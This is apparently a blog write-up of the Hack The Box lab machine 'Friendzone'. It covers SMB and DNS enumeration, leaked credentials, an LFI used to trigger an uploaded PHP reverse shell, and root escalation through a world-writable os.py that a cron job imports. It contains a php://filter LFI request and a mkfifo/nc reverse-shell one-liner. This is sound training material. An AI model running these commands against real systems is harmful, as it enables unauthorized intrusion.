---
layout: single
title: Friendzone - Hack The Box
excerpt: "Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root."
date: 2019-07-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-friendzone/friendzone_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - smb
  - smbmap
  - vhosts
  - php
  - python
  - cronjob
  - dns
  - axfr
---

![](/assets/images/htb-writeup-friendzone/friendzone_logo.png)

Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root.

## Summary

- A SMB share I access to contains credentials
- I can do a zone transfer and find a bunch of sub-domains
- The dashboard page contains an LFI which I can use in combination with the writable SMB share to get RCE
- After getting a shell as `www-data`, I find plaintext credentials that I use to log in as user `friend`
- A python script using `os.py` runs as root and `os.py` is writable so I can add code to get a reverse shell as root

## Detailed steps

### Nmap scan

The box has a got a couple of services running. I take note of the DNS server since this could be used to do a DNS zone transfer and query various records that may contain useful information.

```
# nmap -sC -sV -p- 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 19:05 EST
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.013s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP site

Anonymous access is not allowed on the FTP server:

```
# ftp 10.10.10.123
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
```

Nothing pops up on Exploit-DB for this version of vsFTPd so I'll move on.

### Web enumeration

The site is just a simple page with nothing interactive on it but there is a domain name at the bottom which I'll investigate further.

![](/assets/images/htb-writeup-friendzone/friendzone.png)

### SMB shares

Using `smbmap` I can list the shares on the box:

```
# smbmap -H 10.10.10.123
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445	Name: friendzone.htb                                    
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	Files                                             	NO ACCESS
	general                                           	READ ONLY
	Development                                       	READ, WRITE
	IPC$                                              	NO ACCESS
```

I can also find where the shares on the filesystem are mapped with the `smb-enum-shares` nmap script:

```
# nmap -p 445 --script=smb-enum-shares 10.10.10.123
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 20:52 EST
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.0089s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 2.82 seconds
```

Listing files from the share:

```
# smbmap -H 10.10.10.123 -r
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.123...
[+] IP: 10.10.10.123:445	Name: friendzone.htb                                    
	Disk                                                  	Permissions
	----                                                  	-----------
	print$                                            	NO ACCESS
	Files                                             	NO ACCESS
	general                                           	READ ONLY
	./                                                 
	dr--r--r--                0 Wed Jan 16 15:10:51 2019	.
	dr--r--r--                0 Wed Jan 23 16:51:02 2019	..
	fr--r--r--               57 Tue Oct  9 19:52:42 2018	creds.txt
	Development                                       	READ, WRITE
	./                                                 
	dr--r--r--                0 Sat Feb  9 15:50:02 2019	.
	dr--r--r--                0 Wed Jan 23 16:51:02 2019	..
	IPC$                                              	NO ACCESS
```

`creds.txt` looks interesting:

```
# smbclient -U "" //10.10.10.123/general

Enter HTB\'s password: 
Try "help" to get a list of possible commands.
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
smb: \> exit
root@ragingunicorn:~/htb/friendzone# cat creds.txt
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Found some credentials: `admin` / `WORKWORKHhallelujah@#`

### Sub-domains enumeration

Now that I have credentials, I just need to find where to use them.

I can do a zone transfer for that domain I saw earlier on the main page and get the list of all sub-domains:

```
# host -t axfr friendzone.red 10.10.10.123
Trying "friendzone.red"
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56850
;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzone.red.			IN	AXFR

;; ANSWER SECTION:
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800

Received 250 bytes from 10.10.10.123#53 in 12 ms
```

I'll add those entries to my local `/etc/hosts`.

### Upload page

There's a php application to upload images at `https://uploads.friendzone.red`.

![](/assets/images/htb-writeup-friendzone/upload.png)

Whenever I upload a file (image or not), I get a successful message:

![](/assets/images/htb-writeup-friendzone/upload_successful.png)

### Administrator page

The `https://administrator1.friendzone.red` page contains a login form on which I can use the credentials I found in the SMB share.

![](/assets/images/htb-writeup-friendzone/admin_login.png)

After logging in I am asked to go to `dashboard.php`.

![](/assets/images/htb-writeup-friendzone/admin_login_successful.png)

The dashboard page seems to be some application that deals with images, but it's not really clear what it does except take an image name as a parameter and a pagename.

![](/assets/images/htb-writeup-friendzone/dashboard.png)

If I try the parameters displayed on the page I get:

![](/assets/images/htb-writeup-friendzone/dashboard_params.png)

The image is linked to `/images`, but none of the files I tried to upload from the previous upload page are found in that directory.

![](/assets/images/htb-writeup-friendzone/images.png)

There's an LFI in the `pagename` parameter and I can use a PHP base64 encode filter to read files:

Request: `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=pagename=php://filter/convert.base64-encode/resource=dashboard`

![](/assets/images/htb-writeup-friendzone/dashboard_lfi.png)

The base64 encoded text is the source code for `dashboard.php`:

```php
<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>
```

The `.php` suffix is added automatically after the filename so I can't arbitrarily read any files. I tried the PHP path truncation technique as well as adding null bytes at the end of string but I was not able to bypass this.

I also dumped the `upload.php` source code and saw that the upload thing is just a troll since it doesn't do anything.

```php
<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>
```

### Getting a shell with PHP

The `Development` share I saw earlier is writable by the guest user so I can upload a PHP reverse shell in there and use the LFI to trigger it. The full path of the share is `/etc/Development` as indicated in the nmap script output.

```
# smbclient -U "" //10.10.10.123/Development
Enter HTB\'s password: 
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (184.9 kb/s) (average 184.9 kb/s)
smb: \> 
```

I trigger the shell with the following request: `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell`

```
# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 36974
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 23:16:59 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/$
```

Found other credentials in the `/var/www` directory:

```
www-data@FriendZone:/var/www$ ls -la
ls -la
total 36
drwxr-xr-x  8 root root 4096 Oct  6 15:47 .
drwxr-xr-x 12 root root 4096 Oct  6 02:07 ..
drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
drwxr-xr-x  4 root root 4096 Oct  6 01:47 friendzone
drwxr-xr-x  2 root root 4096 Oct  6 01:56 friendzoneportal
drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
drwxr-xr-x  3 root root 4096 Oct  6 02:05 html
-rw-r--r--  1 root root  116 Oct  6 15:47 mysql_data.conf
drwxr-xr-x  3 root root 4096 Oct  6 01:39 uploads
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

There's a `friend` user in the local passwd database:

```
www-data@FriendZone:/var/www$ grep friend /etc/passwd
grep friend /etc/passwd
friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
```

I can SSH in with those credentials and grab the `user.txt` flag:

```
root@ragingunicorn:~/htb/friendzone# ssh friend@10.10.10.123
Ilcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Sat Feb  9 23:43:09 2019 from 10.10.14.23
friend@FriendZone:~$ cat user.txt
a9ed20...
```

### Privesc

`/opt/server_admin` contains a `reporter.py` script that probably runs every minutes in a root owned cronjob:

```
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

I can confirm it's running in a cronjob by using pspy:

![](/assets/images/htb-writeup-friendzone/pspy.png)

The script doesn't really do anything except import the standard `os` module.

Looking at the module definition, I see that the permissions are world writable on the one for Python 2.7:

```
friend@FriendZone:/opt/server_admin$ find /usr -name os.py 2>/dev/null
/usr/lib/python3.6/os.py
/usr/lib/python2.7/os.py
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.py
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python3.6/os.py
-rw-r--r-- 1 root root 37526 Sep 12 21:26 /usr/lib/python3.6/os.py
```

I can modify the `os.py` file and add a reverse shell at the end so when the module is imported by the script it'll execute my reverse shell.

```
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 5555 >/tmp/f")
```

A few moments later I get a shell as root:

```
# nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 60168
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
b0e6c6...
```